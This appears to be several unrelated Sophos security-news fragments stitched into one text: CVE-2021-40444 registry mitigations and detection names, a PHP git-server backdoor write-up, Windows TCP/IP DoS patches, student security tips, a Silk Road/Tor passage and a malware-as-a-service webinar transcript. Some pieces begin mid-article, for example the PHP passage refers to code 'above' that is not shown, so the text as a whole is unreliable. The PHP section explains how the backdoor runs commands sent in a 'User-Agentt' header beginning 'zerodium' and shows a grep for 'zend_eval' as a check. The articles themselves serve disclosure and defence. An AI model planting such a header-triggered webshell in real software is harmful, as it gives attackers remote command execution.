ENTRIES YOU MAY FIND USEFUL \n 1. To neutralise ActiveX inside Internet Explorer (of which MSHTML forms the core, as explained above), follow the registry modification instructions in Microsoft\u2019s own  Security Update Guide  for CVE-2021-40444. \n Sophos customers who have applied these modifications can use the Sophos Live Discover tool to search their network for computers that  missed out on the mitigation  with a query like this: \n \r\nSELECT name, type, data, datetime(mtime, 'unixepoch', 'localtime') AS registryWriteTime,\r\nCASE\r\n   WHEN data = '3' THEN 'ActiveX set to DISABLED as recommended by Microsoft'\r\n   ELSE 'ActiveX setting does not match the Microsoft recommendation'\r\nEND AS mitigationStatus\r\nFROM registry\r\nWHERE path LIKE 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%\\1001' \r\nOR path LIKE 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%\\1004'\r\n \n \n 2. In the Windows Group Policy Editor, look for the settings listed below.  \n You can use the  gpedit.msc  app to edit the local Group Policy on a standalone computer, or the  Group Policy Management Console  app if you are managing a Windows domain. \n Note that the VBA settings below (VBA is short for  Visual Basic for Applications , also known as \u201cOffice macro code\u201d) don\u2019t directly help with the CVE-2021-40444 zero-day hole, which relies on ActiveX, but are worth considering as an additional part of your Microsoft Office security posture. \n \r\nUser Configuration > Administrative Templates > \r\n   Microsoft Office 2016 > Security Settings >\r\n      Disable All ActiveX                 <--if you don't need ActiveX\r\n      Disable VBA for Office Applications <--if you can do without document macros\r\n\r\nUser Configuration > Administrative Templates >\r\n   Microsoft Excel 2016 > Excel Options > Security > Trust Center\r\n      Block macros from running in Office files from the internet\r\n\r\nUser Configuration > Administrative Templates >\r\n   Microsoft Excel 2016 > Excel Options > Security > Trust Center\r\n      Block macros from running in Office files from the internet\r\n      \r\nUser Configuration > Administrative Templates >\r\n   Microsoft Powerpoint 2016 > Powerpoint Options > Security > Trust Center\r\n      Block macros from running in Office files from the internet   \r\n\r\nUser Configuration > Administrative Templates >\r\n   Microsoft Word 2016 > Word Options > Security > Trust Center\r\n      Block macros from running in Office files from the internet   \r\n \n To administer the Office settings above via the Group Policy editor, you will need to install the  Administrative Templates for Office 365, Office 2019 and Office 2016 files  from Microsoft, which aren\u2019t installed by default on Windows desktops or servers, even if you have already installed Office itself.  \n Download the above file, extract the contents to your desktop or some other convenient folder, and then copy the contents of the  admx  directory and its subdirectories into  C:\\Windows\\Policy Definitions . \n \n 3. If you want to turn on the  Disable All ActiveX  option on your own computer directly without using  gpedit , and you are comfortable with editing the Windows registry yourself, you can create the following entry: \n \r\nHKEY_CURRENT_USER > SOFTWARE > Policies > Microsoft >   <--these keys should already exist\r\n   office > commmon > security >                        <--use \"New - Key\" to create these nested subkeys                   \r\n      [DWORD] disableallactivex = 1                     <--finally, use \"New - DWORD (32-bit) Value\"\r\n \n \n 4. From  CMD.EXE  (a regular command prompt window), you can use these commands to check and set the relevant registry entry: \n \r\n> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\office\\common\\security ^\r\n    /v disableallactivex \r\nERROR: The system was unable to find the specified registry key or value.\r\n\r\n> reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\office\\common\\security ^\r\n    /v disableallactivex ^\r\n    /t REG_DWORD /d 1\r\nThe operation completed successfully.\r\n\r\n> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\office\\common\\security ^\r\n    /v disableallactivex \r\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\office\\common\\security\r\n    disableallactivex    REG_DWORD    0x1\r\n \n \n SOPHOS DETECTION NAMES \n Sophos products, including email, firewall and endpoint protection products, can detect and block this exploit and the malware we\u2019ve seen delivered with it. \n You can search for the following names in your product logs: \n \r\nExp/2140444-A     \r\nTroj/JSExp-W     \r\nTroj/Cabinf-A\r\nTroj/Agent-BHRO\r\nTroj/Agent-BHPO\r\n \n Note that the final malware delivered by the crooks may differ from attack to attack, and note also that the specific  Troj/Agent-*  zombie malware variants listed could be delivered in other ways. \n In other words, an attack with  Exp/2140444-A  wouldn\u2019t inevitably lead to  Troj/Agent-BHRO  or  Troj/Agent-BHPO  on your network, while the presence of  Troj/Agent-BHRO  or  Troj/Agent-BHPO  on their own wouldn\u2019t inevitably imply that the cause was  Exp/2140444-A . \n \n\t\t\t",

WE TAKE ACTION\r\n     \r\n     \r\n      Get 24/7 managed threat hunting, detection, and response delivered by\r\n      Sophos experts\r\n     \r\n     \r\n        Learn\u00a0more  \r\n     \r\n   \r\n \n\t\t\t \n What it does \n The modifications above introduce a nasty remote code execution backdoor to any server that uses PHP\u2019s  Zlib compression for content it sends out.  \n (These days, many, if not most, web pages are compressed before they\u2019re transmitted, unless they are files such as images or download archives that are already compressed and so won\u2019t compress much more, if at all.) \n The backdoor is triggered when PHP output compression starts, and it: \n \n Looks for a header in the incoming request called  User-Agentt .  Web requests usually include a  User-Agent  header that denotes which browser you are using. This is nearly, but not quite, the same name used as a command carrier.\n Checks that the header starts with the word \u2018zerodium\u2019 .  Zerodium  is a reference to a company that buys zero-day exploits in third-party products for its own use, in contrast to software vendors who offer bug bounties for responsible disclosure of bugs so that they can be patched.\n Treats the rest of the header as a command and runs it.  This causes remote code execution (RCE), typically giving the attacker the same rights and privileges as the web server itself.\n \n This backdoors turns PHP itself into what\u2019s known as a  webshell  \u2013 an implanted malicious file on the server that can not only be triggered by an external attacker, but also instructed to run any system command the attacker wants at any time. \n In other words, a remote shell of this sort doesn\u2019t just let cybercriminals run some commands, it lets them run any commands, and therefore to adapt and alter their attack as they go along. \n What happened? \n The unauthorised code changes were tagged with the names of Rasmus Lerdorf (creator of PHP) and Nikita Popov (a major PHP contributor). \n PHP development is managed using the well-known Git source code control system, on a server operated by the PHP team itself. \n According  to Popov: \n We don\u2019t yet know how exactly this happened, but everything points towards a compromise of the git.php.net server (rather than a compromise of an individual git account). \n Until now, the team has used Microsoft\u2019s cloud-based GitHub service as a mirror (secondary copy) of its codebase, but says that \u201cthe repositories on GitHub [\u2026] will become canonical,\u201d which is the jargon term for the primary copy, and says \u201cwe have decided that maintaining our own git infrastructure is an unnecessary security risk, and that we will discontinue the git.php.net server.\u201d \n Popov also said: \n We\u2019re reviewing the repositories for any corruption beyond the two referenced commits. Please contact security@php.net if you notice anything. \n What to do? \n The good news, as we mentioned above, is that this backdoor didn\u2019t make it into any official PHP releases, so it\u2019s highly unlikely that this Trojan Horse code made it into any real-world servers. \n In particular, if you didn\u2019t download PHP and rebuild it from source code over the past weekend, you\u2019re unlikely to have come anywhere near this. \n If you\u2019re worried, check the file  etc/zlib/zlib.c  in your PHP source code tree for signs of the added lines shown above. \n In particular, the text string  zend_eval  should not appear anywhere in the  /etc/zlib/*  files, so if you run this command from the top of your PHP tree, you shouldn\u2019t see any matches: \n \r\n/home/user/php-source$ grep -R zend_eval etc/zlib/*\r\n/home/user/php-source$\r\n \n If the above backdoor code has somehow made it into your PHP tree, you would see something like this instead\u2026 \n \r\n/home/user/php-source$ grep -R zend_eval ext/zlib/*\r\next/zlib/zlib.c:         zend_eval_string(Z_STRVAL_P(enc)+8, NULL, [...]\r\n/home/user/php-source$\r\n \n In the unlikely event that your code includes the backdoor, you need to refresh your PHP source from the new repository as well as looking for any other unexplained modifications in your code, or unexpected commands in your logs.. \n \n\t\t\t",

(That\u2019s why your own sysadmins almost certainly don\u2019t let you run with Administrator rights any more like they used to back in the 2000s.) \n Ransomware criminals, for example, typically spend time at the start of their attack looking for an unpatched EoP bug that they can exploit to boost themselves to have the same power and authority as your own sysadmins. \n If they can grab domain administrator rights, they\u2019re suddenly on an equal footing with your own IT department, so they can pretty much do whatever they like. \n Intruders who have access to an EoP exploit will probably be able to: access and map out your entire network; alter your security settings; install or remove any software they like on any computer; copy or modify any file they like; tamper with your system logs; find and destroy your online backups; and even to create secret \u201cbackdoor\u201d accounts that they can use to break back in if you find them this time and kick them out. \n But that\u2019s not all \n If you\u2019re still not convinced to patch early, patch often, you might also want to read Microsoft\u2019s special security bulletin entitled  Multiple Security Updates Affecting TCP/IP . \n The three vulnerabilities listed in this bulletin are the uninterestingly named CVE-2021-24074, CVE-2021-24094, and CVE-2021-24086. \n The bugs they represent, however, are very interesting indeed. \n Even though Microsoft admits that two of them could, in theory, be exploited for remote code execution purposes (thus they make up 2 of the 4 RCE bugs mentioned above), that\u2019s not what Microsoft is  most worried about  right now: \n \nThe two RCE vulnerabilities are complex which make it difficult to create functional exploits, so they are not likely [to be abused] in the short term. We believe attackers will be able to create DoS exploits much more quickly and expect all three issues might be exploited with a DoS attack shortly after release. Thus, we recommend customers move quickly to apply Windows security updates this month.  \n The DoS exploits for these CVEs would allow a remote attacker to cause a stop error. Customers might receive a blue screen on any Windows system that is directly exposed to the internet with minimal network traffic.\n \n DoS, of course, is short for  denial of service  \u2013 a type of vulnerability that\u2019s often downplayed as the \u201clast amongst equals\u201d when compared to security holes such as RCE and EoP. \n Denial of service means exactly what it says: crooks can\u2019t take over a vulnerable service, software program or system, but they can stop it working altogether. \n Unfortunately, these three DoSsable holes are low-level bugs right down in the Windows kernel driver  tcpip.sys , and the flaws can, in theory, be tickled-and-triggered simply by your computer receiving incoming network packets. \n In other words, just proceesing the packets in order to decide whether to accept and trust them in the first place could be enough to crash the targeted computer \u2013 which could, of course, be a mission critical internet-facing server. \n What to do? \n Microsoft itself is warning you to prioritise these patches if you like to do your updates one-at-a-time, and has even come up with scriptable workarounds for those who are still afraid of the \u201cpatch early\u201d principle: \n \nIt is\u202fessential that\u202fcustomers apply Windows updates to address\u202fthese vulnerabilities as\u202fsoon\u202fas possible. If\u202fapplying the update quickly is not practical,\u202fworkarounds\u202fare detailed in the CVEs that do not require\u202frestarting a server.\n \n Despite the workarounds, we\u2019re with Microsoft here, and we agree wholeheartedly with the words  essential  and  as soon as possible . \n Don\u2019t delay.

I\u2019m Harriet Stone, an intern in the Sophos marketing team.  \n Seven months of working (virtually) with cybersecurity professionals has made me realise just how unaware many students are when it comes to their online security. \n Even before the COVID-19 pandemic drove a switch to online learning, most university students needed to use a computer every day.  \n Whether for communicating with classmates, taking notes in lectures or doing research for assignments, technology is seriously important for any student. \n I asked 15 students who were not studying computing or cybersecurity about their online security behaviours and even though this was just an informal study, the results surprised me.  \n Given that technology is such a huge part of student life, it is alarming how many students are oblivious to or unconcerned about cybersecurity threats. \n So, here are some simple cybersecurity tips that all students (and non-students) should know to protect themselves \u2013 do your homework! \n \t\t\t\t \n\t\t\t\t \r\n   \r\n     \r\n      OTHERS STOP AT NOTIFICATION. WE TAKE ACTION\r\n     \r\n     \r\n      Get 24/7 managed threat hunting, detection, and response delivered by\r\n      Sophos experts\r\n     \r\n     \r\n        Learn\u00a0more  \r\n     \r\n   \r\n \n\t\t\t \n 1. Stick to HTTPS websites \n Doing research for assignments requires students to hop between many websites every day \u2013 but how often do you actually check the search bar?  \n Make sure you check that each website you visit uses HTTPS (secure HTTP, where there\u2019s a padlock in the address bar) rather than plain old HTTP. \n 13 of the 15 students asked did not know the difference between HTTPS and HTTP. \n Fortunately, if an insecure web page asks for passwords or other personal information, most browsers will warn you not to enter it, because  data in insecure web traffic can easily be snooped on as it travels across the internet. \n However, it\u2019s important that you know the difference between HTTPS and HTTP for yourself, to ensure that all communication is encrypted against eavesdropping as it travels between your browser and the sites you visit.  \n The web content you look at, and even the order in which you visit a series of web pages \u2013 especially if those pages are on sites you wouldn\u2019t normally visit, but that you need to check out for research purposes \u2013 tell a story about you that is none of anyone else\u2019s business. \n 2. Be cautious about scams \n University students typically receive many emails a day regarding lectures, seminars, newsletters, student union activities and other university-related information.  \n Despite the flood of emails, you need to stay alert, and read emails cautiously \u2013 especially if they ask you to take some sort of action on your computer such as clicking a link, downloading a file, installing a new app or changing a system setting. \n To prevent being scammed or phished (that\u2019s where you get tricked into giving confidential information to the wrong person, e.g. via a phoney website), it is important that you ensure that the sender really is who they say they are. \n If you\u2019re not careful, you could end up disclosing information and details that should be kept private, including credit card numbers, details from ID documents such as your driving licence or passport, or your home address.  \n When it comes to personal data, use the mantra, \u201c If in doubt, don\u2019t give it out. \u201d \n 3. Log out or lock your computer when you\u2019re not using it \n Many students use the library to study \u2013 but there are many distractions, even in a library.  \n Walking away from your laptop for just two minutes for a trip to the vending machine could be potentially dangerous if you \u201ccan\u2019t be bothered\u201d to log out or lock your computer before you leave it unattended.  \n Although it\u2019s unlikely that there is going to be somebody lurking and waiting for you to leave your account open and free for them to use for a moment, it is better to be safe than sorry.  \n Better to spend a few seconds unlocking your screen or logging back in than to give someone a chance to mess with your settings, peek at your files or install some sort of malicious app to snoop on you. \n Even if all that happens is that one of your \u201cfriends\u201d posts a silly Facebook message behind your back, it\u2019s still something you wouldn\u2019t have said yourself that ends up  online under your name. \n Alarmingly, only 3 of the 15 students asked said they log out of their account or lock their system when they leave their laptop unattended in the library. \n We recommend that you use a hotkey to lock the computer manually. Don\u2019t rely on \u201cautolock\u201d, because that usually takes at least two minutes to kick in after you leave your laptop alone. Use  Windows+L  on Windows or  Control+Command+Q  on a Mac. \n 4. Get yourself a good password manager \n Surprisingly, 13 of the 15 students said that they do not use a password manager.  \n Students are probably already drowning in passwords with all their social media accounts, and when university starts, the number of passwords inevitably increases.  \n When you have lots of passwords to remember, it\u2019s easy to get into the habit of using the same (or at least very similar) passwords for every account. \n In other words, if one of your accounts gets hacked, the person who hacked it immediately knows how to get into all your other accounts as well. \n A password manager automatically chooses and remembers a strong and different password for each account.  \n It also helps to stop you from accidentally putting passwords into imposter sites (that\u2019s what we described as \u201cphishing\u201d above), because the password manager keeps a record of the correct web page to use for each account. \n Just remember to pick a really good password for the password manager itself!  \n For tips on picking proper passwords, including the password for your password manager, watch our  How to Pick a Proper Password  video: \n \n (No video? Watch  on YouTube . No audio? Click on the [CC] icon for subtitles.) \n Reduce your cyberstress \n Starting university can be incredibly nerve-racking, even without the new cybersecurity threats you face when you set out on your own into a world where you\u2019re expected to spend hours online every day just to do the research you need to complete your course. \n Trying these simple cybersecurity tips will help reduce your cyberstress \u2013 and will help you to keep your personal accounts and your private data to yourself! \n \n\t\t\t",

Through his ownership and operation of Silk Road, Ulbricht reaped commissions worth tens of millions of dollars [\u2026] Ulbricht even solicited six murders-for-hire in connection with operating the site, although there is no evidence that these murders were actually carried out. \n One of those \u201chitmen\u201d was, apparently, an  undercover cop , but Ulbricht was never charged for this alleged hiring-of-hitmen activities. \n There were more than enough serious charges against Ulbricht anyway, for which he received two life-means-life jail terms plus an extra 20 years. \n What to do? \n It\u2019s hard to know how to offer advice in a case like this, where the fact that the suspect was not as anonymous as they had hoped turned out to be a very good thing, given the enormity of the allegations against him. \n However, there are many perfectly legitimate reasons why you might want to use something like the Tor Browser, even if your purpose for being pseudo-anonymous online is as simple as wanting to browse the web without being tracked and traced as much as usual. \n Just remember \u2013 as this case and the case of Ross Ulbricht remind us \u2013 that online anonymity only goes so far. \n So, if you plan to use Tor for legitimate purposes, make sure you RTFM first, as we advise in  the video above , lest you inadvertently make yourself more of a target for online crooks than before. \n \n\t\t\t",

Hello, everybody \u2013 welcome to the Security SOS 2021 webinar series.  \n I\u2019m Paul Ducklin, and today my guest is Fraser Howard, whom I always like to describe as \u201cThe Malware Specialist in Everything.\u201d \n Fraser, welcome back to the SOS series! \n \n FH.  Hi, Duck, good to be here. \n \n PD.  Today\u2019s topic, as you can see, is the intriguing sounding: \u201cMalware \u2013 the never-ending story.\u201d  \n Why we chose that topic \u2013 that was actually me remembering\u2026 this is going back to the late Eighties or the early Nineties. \n It was a year when I think we were only in March and [DRAMATIC VOICE] we\u2019d already had 28 viruses. \n \n FH.  [LAUGHS] \n \n PD.  And colleagues said, \u201cWow, you\u2019re really busy at the moment, but what do you think you\u2019ll do when this fad burns out?\u201d  \n And I\u2019m still wondering [LAUGHS] what the answer is to that question, because it really has turned into a never-ending story, hasn\u2019t it, Fraser? \n \n FH.  It has! \n I mean, I can\u2019t even imagine\u2026 I think even 10 or 15 years ago, we still counted things\u2026 \n \n PD.  Yes! \n \n FH.  \u2026and things then were in the tens, if not hundreds of thousands.  \n I think nowadays I\u2019ve stopped counting, there\u2019s just too much. \n \n PD.  Particularly when the crooks are often not delivering those malware samples by themselves, are they?  \n They\u2019re working in an environment where there\u2019s an affiliate network, if you like. \n The core malware creators, the crooks at the core \u2013 if you look at the ransomware gangs \u2013 write the malware, and then they recruit a whole load of affiliates to go out and do the dirty work with it. \n \n REvil ransomware crew dangles $1,000,000 cybercrime carrot \n \n \n \n FH.  Yes, exactly that. \n And people build all sorts of services around this whole ecosystem that provide them additional capabilities, from simple capabilities like using obfuscation and packing techniques to try and make their creation less easy to detect\u2026 \n \n PD.  And even worse, some of the packing technologies that the malware authors use, the first time you see them, or if you show them to someone who\u2019s technical but hasn\u2019t looked at them before, they\u2019ll go, \u201cWell, that\u2019s easy to detect. It\u2019s so suspicious!\u201d \n But yet some of the tools they use are also used for packing and copy protection on legitimate software. \n \n FH.  Yes.  \n That\u2019s the annoying part, when  benign, legitimate software that uses those very same tools. \n This makes it hard \u2013  hard for humans and also hard for technology like deep learning.  \n It makes it harder to train automation when the legitimate and the malicious files have very similar characteristics. \n \n RATicate malware gang goes commercial \n \n \n \n PD.  In terms of Malware-as-a-Service, where affiliates are being recruited, it\u2019s way more than just ransomware, isn\u2019t it?  \n There are whole market niches in the cybercrime ecosystem where different malware service providers provide different sorts of tools. \n \n FH.  Yes, definitely.  \n And in many senses, if you\u2019re a cybercriminal looking to maybe steal data, you probably like the fact that ransomware has taken all the headlines.  \n Cybercrime history is full of cases where one or a few kind of notorious criminal groups, or a few notorious threats, have the sole focus of law enforcement and press.  \n And the reality is, behind that, under the radar if you like, there has always been a whole bunch of other threats that, in many cases, might be more important and more of a risk to lots of people out there. \n \n Malware-as-a-service \u201cFully UnDetectable\u201d operators busted \n \n \n \n PD.  The crooks that unleashed that ransomware attack, and finally lit the blue touch paper in July \u2013 they may have been in your network since April, March\u2026 \n \n FH.  Yes. \n \n PD.  \u2026or even December of the year before.  \n \n FH.  Yes. \n \n PD.  And who knows what else they\u2019ve done?  \n They\u2019ve almost certainly created new accounts so they can get back in later; they\u2019ve probably stolen all your trophy data; they\u2019ve almost certainly wiped out all the backups they can, in case you think you can recover without paying.  \n And who knows how many keystrokes they\u2019ve logged and how many passwords they\u2019ve captured during that time?  \n It can be very hard to tell after the fact, can\u2019t it? \n \n FH.  So, you mentioned keystrokes there\u2026 \n It\u2019s funny, because I remember, a few years ago, doing a demo on what was at that time was some notorious piece of malware. \n Actually, we then got into conversation about simplistic keylogging trojans, and how that type of malware is one of those insidious kind of threats that you can have in your network.  \n And if you think of the type of data that you type, and if someone\u2019s harvesting that data on a continual basis\u2026 it\u2019s very easy to see how  you can lose credentials, lots of sensitive IP data.  \n And lots of threats today, and lots of ransomware attacks, they get onto a network at some point, and from there, they co-ordinate the rest of the attack\u2026  \n \u2026in many cases, that initial access is through stolen credentials, essentially credentials that have been stolen by one cybercriminal and then sold online to facilitate crime from others. \n And on that same topic, things that just take simple screenshots, and take a screenshot every few minutes or every hour\u2026 again, lots of very sensitive data can be stolen. \n Maybe that data then enables a second attacker to access those systems, or realize there\u2019s some kind of highly prized data that could be available. \n \n PD.  Fraser, I just want to jump back to something you mentioned earlier about these criminal operations where there\u2019s a service that\u2019s provided.  \n Talk to us a little bit about perhaps one of the more infamous malware-as-a-service groups, namely: Emotet. \n \n FH.  Yes, the notorious Emotet!  \n So, that was one of the good stories that came out of this year.  \n In January of this year, multiple law enforcement organizations worked together to take out a lot of the infrastructure that was being used by Emotet.  \n And as weeks, months have ticked on since then, they essentially took out that particular threat family. \n Emotet itself has been\u2026 I said notorious \u2013 that\u2019s an understatement \u2013 for probably 12, 18, 24 months. \n It was certainly the number one non-ransomware threat family that was regularly discussed by law enforcement, by various kinds of news articles, and the like. \n That was primarily due to the aggressive nature in which the attackers sought to maintain their presence, and the size of their botnet, through things like aggressive spam campaigns to continually infect new victims and essentially conscript new victims into their botnet.  \n And also the way in which Emotet itself was used as a malware delivery service, basically infected machines had other malware pushed to them. \n So, the bad guys were essentially using that network as a means to distribute other malware.  \n Other people would pay them money to push malware through their botnet. \n \n Emotet takedown \u2013 Europol attacks \u201cworld\u2019s most dangerous malware\u201d \n \n \n \n PD.  Yes, because for many attacks, the Emotet malware family and the Emotet service, that was the beginning of an attack that may have led to ransomware, wasn\u2019t it?  \n Because Emotet wasn\u2019t about ransomware, it was\u2026 how would you describe it?  \n It\u2019s \u201cmalware delivery malware\u201d, basically. \n \n FH.  Essentially, yes.  \n Once part of that botnet, you as the victim would be completely unaware that your machine was infected. \n The malware was designed to run in the background; there was nothing visible; no visible damage in terms of file encryption or in terms of messages. \n It was simply a service that was running alongside all the other hundreds of Windows services in the background, but this particular service was used by the Bad Guys to push other malicious activity later on\u2026 \n \n PD.  \u2026waiting for some other gang of crooks to come along, say to the Emotet guys, \u201cI need a thousand infected computers by tomorrow, all in one network. What have you got?\u201d  \n And they\u2019d say, \u201cYeah, we can do that. We can do that, how much are you willing to pay?\u201d \n Then they\u2019d use their botnet (in case you\u2019re wondering, that\u2019s short for \u201crobot network\u201d), and the Emotet guys would just deliver pre-infected computers to paying \u201ccustomers\u201d. \n \n FH.  Yes.  \n Emotet certainly was not the first kind of malware family to do this, far from it, but it was just one of the more recent ones, and they did it in a way where they did it very effectively.  \n And so they were individually responsible for quite a lot of victims being hit with a whole variety of different threats. \n \n PD.  Just to be clear, for those of our listeners who are wondering, \u201cWell, how can botnets be controlled through a firewall?\u201d  \n Because, particularly if you\u2019re in a small network or a home network, you\u2019ve probably got a router that doesn\u2019t allow incoming connections \u2013 many ISPs even prohibit that, you can\u2019t set it up even if you want.  \n Modern zombies or bots, in fact, for years, they just don\u2019t work that way, do they?  \n They don\u2019t wait for the crooks to send them instructions, they just regularly and gently call home, possibly to one of thousands of ever-varying servers, so it\u2019s not obvious where they\u2019re going. \n Then they download the instructions on, \u201cDear Boss, what should I do next?\u201d \n \n FH.  Yes.  \n And they typically use HTTPS, so it just blends in with other web traffic that\u2019s also using HTTPS from the victim machine, so it can be very hard to spot. \n \n How bots and zombies work, and why you should care \n \n \n \n PD.  So the Emotet guys, the \u201cmalware delivery malware\u201d experts, they got taken down\u2026  \n What happened next?  \n Because often you see that almost as soon as one gang gets taken out, either they don\u2019t get arrested and they just pop up with a new name somewhere else, or somebody else figures, \u201cWoo hoo, that\u2019s my competitive advantage,\u201d and new crooks fill the vacuum.  \n What happened after the Emotet takedown? \n \n FH.  Yes, the next chapter in this story, and the one that people expect to hear, is, \u201cWhat threat family fills that void as soon as Emotet has gone?\u201d \n And the reality is that there are multiple threat families that are already doing something similar to Emotet, even whilst Emotet is active.  \n And, no doubt, those same families have, to whatever extent, filled that void.  \n To date, there isn\u2019t a single one that stands out as having replaced Emotet, but there are a few notorious families, several of which have been spoken about and posted about on Naked Security, families like BuerLoader, Dridex, BazarLoader\u2026 \n These families are getting used, and some of their functionality enables the bad guys to use them as a service to distribute other components of malware and other parts of an attack. \n \n Buer Loader \u201cmalware-as-a-service\u201d joins Emotet for ransomware delivery \n \n \n \n PD.  I guess that\u2019s an important reminder that malware detection and prevention is not all about the shiny visible stuff!  \n For example, let\u2019s say we got rid of all ransomware\u2026 we\u2019d still have to worry about all the other malware of the past. \n The problem really retains the cumulative history of all the malware that went before\u2026 \n \n FH.  It does.  \n And actually, that\u2019s an interesting example you just brought up there.  \n So in some senses, for a well-protected network, using some of the technologies that are available in today\u2019s security products, actually ransomware is quite hard \u2013 technologies like CryptoGuard can make it really hard for the Bad Guys to actually encrypt your data.  \n Partly for that reason, ransomware authors, the attackers, have already shifted to what we call \u201cdouble extortion\u201d type models, where rather than just encrypting the data, actually they\u2019re siphoning it off your network, they\u2019re copying it off your network, somewhere up into the cloud.  \n And they\u2019re still looking to blackmail you, they\u2019re still looking to extort money from you\u2026 not to get your data back after having been encrypted, but to stop the attacker publicly exposing your data because they\u2019ve already stolen it. \n \n PD.  So Fraser, we\u2019ve spoken about Emotet, the \u201cmalware delivery malware\u201d guys. \n But there\u2019s\u2026 not exactly a new kid on the block, but perhaps a new term for many people: the so-called \u201csupply chain attack\u201d, where you fetch software from what you think is a trusted source, but instead of attacking you, the crooks have attacked the person upstream from you.  \n How\u2019s that panning out? \n \n FH.  Again, it\u2019s a technique that\u2019s been around for a long time, and over the last few months, we\u2019ve seen two major attacks that have used it.  \n First one, just before Christmas, was the SolarWinds attack, where criminals who had managed to compromise that software chain were able to subsequently hit people that were already using the software.  \n And more recently, just a couple of a few weeks ago in fact, the Kaseya ransomware attack, where people who were using Kaseya software\u2026 that software was used to distribute malicious commands, which initiated a ransomware attack. \n So from the Gad Guys\u2019 point of view, you can see why it\u2019s so attractive.  \n Earlier on, we spoke about \u201cinitial access\u201d. \n How does the attack get onto a network and potentially laterally move across that network in order to deliver the attack?  \n Actually, the supply chain can solve that problem for them entirely.  \n So, in the case of the Kaseya attack, this Kaseya agent was already running on lots of these endpoints, and by compromising higher up the chain, the bad guys are able to issue their malicious commands across all of the machines that were running that particular software.  \n So, that solves the problem for the attacker of that initial access, gives them it for free. \n \n Kaseya ransomware attackers say: \u201cPay $70 million and we\u2019ll set everyone free\u201d \n \n \n \n PD.  So, loosely speaking, from a software point of view, a supply chain attack simply means that instead of attacking you directly, the crooks just attack someone one or two or three steps up the chain\u2026  \n Where you fetch stuff that you assume you can trust because you\u2019re not downloading it from some weird link that someone just sent you in an email. \n \n FH.  Yes, exactly.  \n And, essentially, that software is backdoored.  \n You\u2019re using legitimate software, but there\u2019s essentially a backdoor in that software that allows cybercriminals to use that software to deliver something bad. \n \n PD.  And this is a particular problem for software development teams, isn\u2019t it, in the modern era, if you\u2019re using languages like Python, or JavaScript, or Ruby or something like that? \n \n FH.  Yes. \n \n PD.  And you\u2019ve got RubyGems, NPM, PyPI\u2026 these package manager tools that go out to the public cloud and download often open source packages that are meant to be open to everybody.  \n So, it actually requires quite a big attention to detail by development, quality assurance, and build engineering teams inside software companies. \n \n FH.  If you\u2019re a cybercriminal group looking to attack a very high profile organization\u2026 we already know that those groups invest months, years; they invest hundreds of thousands, probably millions of pounds, in looking to target those particular organizations.  \n Actually, if you think about it, a supply-chain type attack is a very powerful way of hitting those various organizations. \n So, rather than dedicating all that effort into building up your attack weaponry, you could invest that same effort into building up developers with high reputation on some of these open source projects, contributing positively\u2026 \n \u2026only at some point in time to drop a backdoor in somewhere. \n It\u2019s a perfectly plausible scenario in terms of how these attacks might go in the future. \n \n How one man silently infiltrated dozens of high-tech networks \n \n \n \n PD.  So, one way to attack a single business is to find some software module that\u2019s used by a *million* businesses that have no reason to distrust it, attack all the million businesses, and one of them just happens to be the victim you really wanted.  \n And the flip side of that is, if you\u2019re the kind of crook that wants to attack a million businesses, you can either attack them one at a time like the CryptoLocker ransomware guys used to do back in what was it, 2013?  \n Or you can go, \u201cOK, let\u2019s find the common watering hole and let\u2019s go and poison that.\u201d  \n So, supply chain attacks can actually be used for broadening and deepening attacks, possibly even at the same time. \n \n FH.  Yes.  \n And as you said at the start, they\u2019re very, very hard for the good guys to defend against.  \n Common sense; good practice in terms of what extensions you trust and what tools you merge into your projects, or even the actual tooling that you use; maybe your development environment; what extensions you might choose to use;  all of those considerations become important\u2026  \n Because, when you choose to kind of use one of those extensions, as you said, it\u2019s probably doing exactly what you described: it\u2019s connecting out to the internet, pulling down some third-party code\u2026 \n \u2026but how could it be abused by an attacker as well? \n \n PD. Yes!  \n And it\u2019s not just the case that the crooks will poison the code that you download to build into your own software. \n They can poison the package that you download so that the malware runs when you install or update the package. \n \n FH.  Yes. \n \n PD.  And now the crooks haven\u2019t poisoned one particular build you\u2019ve made, they\u2019ve poisoned your whole build environment for next time as well. \n \n FH.  Yes, and we\u2019ve seen attacks like that in the past where they\u2019ve targeted certain build environments or certain high-level languages, in a way to hit organizations that build and ship packages to customers. \n \n PHP community sidesteps its third supply chain attack in three years \n \n \n \n PD.  Fraser, perhaps this is a good time, given that we\u2019ve just opened up this huge number of ways you can deliver the malware\u2026  \n Maybe this is a good time to talk about something that\u2019s getting a lot of popularity these days, and that is an attempt to codify all this, namely the MITRE ATT&CK framework, which is A-T-T-ampersand-C-K.  \n Tell us something about that, because I know you\u2019ve been doing a lot of work lately with the so-called ATT&CK framework\u2026 which is a framework for defence, not actually for attack. \n \n FH.  So, we talk about attacks, and we talk about how threats work and then inevitably these conversations become quite detailed quite quickly, and quite technical quite quickly.  \n To lots of people that aren\u2019t involved in cybersecurity, it can be hard to follow and hard to properly characterize, \u201cWhat exactly are you talking about?\u201d  \n And so the MITRE ATT&CK framework is essentially a knowledge base. \n And the framework provides tactics and techniques based on real world observations.  \n So, observations into how attacks actually happen, what different techniques the attackers use, and trying to basically break that down and providing a structure by which we can label things.  \n You have, for example, tactics like: execution; initial access; lateral movement; discovery; command-and-control; and there\u2019s a variety of other ones as well.  \n And within each one of these tactics, you have a whole variety of different techniques, as well.  \n For example, brute forcing would be one particular tactic\u2026 \n \n PD.  That\u2019s where you try every possible password rather than just guessing the most likely eight? \n \n FH.  \u2026yes.  \n Sniffing network traffic; using Windows management instrumentation\u2026 there are literally hundreds of different techniques.  \n Basically, the matrix provides a labelling structure so when we, for example, block some malicious activity on a machine, we make an effort to try and associate that block with the most appropriate technique.  \n That can be useful for the customer that has that protection event firing within their organization, because they can then use that technique reference to better understand what type of activity is being blocked in this particular instance. \n \n PD.  Which also tells them, if they want to do threat hunting, where\u2019s the right place to look\u2026 \n \n FH.  Yes.  \n And perhaps most crucially, as well, by adopting the ATT&CK kind of matrix framework, it\u2019s a common language across different security products.  \n And so \u201cTechnique ABC\u201d is 